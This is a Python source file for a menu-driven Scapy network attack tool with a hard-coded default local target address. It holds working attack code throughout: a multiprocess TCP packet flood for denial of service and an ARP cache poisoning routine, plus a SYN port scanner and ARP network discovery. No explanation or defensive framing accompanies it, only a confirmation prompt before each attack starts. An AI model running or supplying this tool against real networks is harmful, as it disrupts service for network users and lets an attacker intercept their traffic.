from scapy.all import *
from multiprocessing import Process, Event
import time
import netifaces

def dos(target_ip: str, stop_event) -> None:
    """Performs a DoS attack by sending TCP packets continuously."""
    while not stop_event.is_set():
        send(IP(dst=target_ip) / TCP(sport=1234, dport=1234), verbose=False)

def arp_spoof(target_ip: str, spoof_ip: str, stop_event) -> None:
    """Performs ARP spoofing by poisoning the target's ARP cache."""
    target_mac = getmacbyip(target_ip)
    if target_mac is None:
        print(f"Could not find MAC address for IP: {target_ip}")
        return
    while not stop_event.is_set():
        send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac), verbose=False)
        time.sleep(2)

def port_scan(target_ip: str, start_port: int, end_port: int) -> None:
    """Scans a target IP for open ports using TCP SYN scanning."""
    print(f"Scanning {target_ip} from port {start_port} to {end_port}...")
    for port in range(start_port, end_port + 1):
        pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")  # SYN Packet
        ans, _ = sr(pkt, timeout=1, verbose=False)
        for sent, received in ans:
            if received.haslayer(TCP) and received[TCP].flags == 0x12:  # SYN-ACK response
                print(f"[+] Port {port} is open.")

def get_available_networks() -> list:
    """Lists available networks based on active interfaces."""
    networks = []
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for link in addrs[netifaces.AF_INET]:
                if 'addr' in link and 'netmask' in link:
                    ip = link['addr']
                    netmask = link['netmask']
                    networks.append(f"{ip}/{netmask}")
    return networks

def scan_network(network: str) -> None:
    """Scans the selected network for active devices."""
    print(f"Scanning network {network}...")
    ans, _ = arping(network)
    for sent, received in ans:
        print(f"IP: {received.psrc} MAC: {received.hwsrc}")

def start_attack(attack_func, target, stop_event, *args, num_processes=5):
    """Starts an attack with multiprocessing and a stop mechanism."""
    if input(f"You are about to start an attack on {target}. Press Enter to continue or any other key to cancel: ") == "":
        stop_event.clear()
        processes = [Process(target=attack_func, args=(target, stop_event, *args)) for _ in range(num_processes)]

        for process in processes:
            process.start()

        input("Press Enter to stop the attack...")
        stop_event.set()

        for process in processes:
            process.terminate()
            process.join()

        print("Attack stopped.")

if __name__ == "__main__":
    stop_event = Event()
    target = "192.168.137.34"

    while True:
        choice = input("\nChoose an option:\n1: Attacks\n2: Change Target IP\n3: Scan Network\n4: Port Scan\n5: Exit\n> ")
        match choice:
            case "1":
                attack_choice = input("Select attack:\n1: DoS\n2: ARP Spoofing\n3: Back\n> ")
                match attack_choice:
                    case "1":
                        num_processes = int(input("Enter number of processes (recommended <50): ") or "10")
                        start_attack(dos, target, stop_event, num_processes=num_processes)
                    case "2":
                        spoof_ip = input("Enter the IP address to spoof: ")
                        start_attack(arp_spoof, target, stop_event, spoof_ip)
                    case "3":
                        continue
                    case _:
                        print("Invalid choice.")
            case "2":
                target = input("Enter the new target IP: ")
                print(f"Target IP changed to {target}")
            case "3":
                print("\nAvailable Networks:")
                networks = get_available_networks()
                if not networks:
                    print("No available networks found.")
                else:
                    for i, net in enumerate(networks, 1):
                        print(f"{i}: {net}")

                    net_choice = int(input("Select a network to scan (Enter number): ") or "1") - 1
                    if 0 <= net_choice < len(networks):
                        scan_network(networks[net_choice])
                    else:
                        print("Invalid selection.")
            case "4":
                start_port = int(input("Enter start port (default 1): ") or "1")
                end_port = int(input("Enter end port (default 1024): ") or "1024")
                port_scan(target, start_port, end_port)
            case "5":
                print("Exiting...")
                break
            case _:
                print("Invalid input. Try again.")
